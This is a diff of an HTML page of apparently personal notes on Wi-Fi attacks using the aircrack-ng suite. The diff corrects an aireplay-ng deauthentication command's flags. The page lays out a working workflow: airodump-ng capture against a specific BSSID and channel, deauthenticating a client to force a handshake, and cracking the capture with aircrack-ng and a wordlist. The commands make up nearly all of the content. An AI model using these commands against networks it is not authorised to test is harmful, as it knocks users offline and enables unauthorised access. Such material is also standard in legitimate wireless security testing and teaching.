@@ -49,7 +49,7 @@
 <p>&nbsp;</p>
 <p><span style="font-size: x-large;">airodump-ng wlan0 <span style="font-size: medium;">#ensure the interface name has not changed</span></span></p>
 <p><span style="font-size: x-large;">airodump-ng --bssid B8:0D:F7:D5:79:F9 -c 6 wlan0mon -w &lt;outputfilename&gt;&nbsp;<span style="font-size: medium;">#bssid and channel for specific capture, add -w for output</span></span></p>
-<p><span style="font-size: x-large;">aireplay-ng -0 &lt;number of deauth packs&gt; -a B8:0D:F7:D5:79:F9 -h 02:00:00:00:09:00 wlan0 <span style="font-size: medium;">#-0 &lt;no. of deauth packs&gt; = deauth -a=connected client mac </span>&nbsp;</span></p>
+<p><span style="font-size: x-large;">aireplay-ng -0 &lt;number of deauth packs&gt; -a B8:0D:F7:D5:79:F9 -c 02:00:00:00:09:00 wlan0 <span style="font-size: medium;">#-0 &lt;no. of deauth packs&gt; = deauth -a=bssid (can use -e followed by name of network)&gt; -c =destination mac </span>&nbsp;</span></p>
 <p><span style="font-size: x-large;">aircrack-ng filename.cap -w &lt;wordlist to crack&gt;&nbsp;<span style="font-size: medium;"># use aircrack once you have enough IVs - need a wordlist to crack</span></span></p>
 <p>&nbsp;</p>
 <hr />
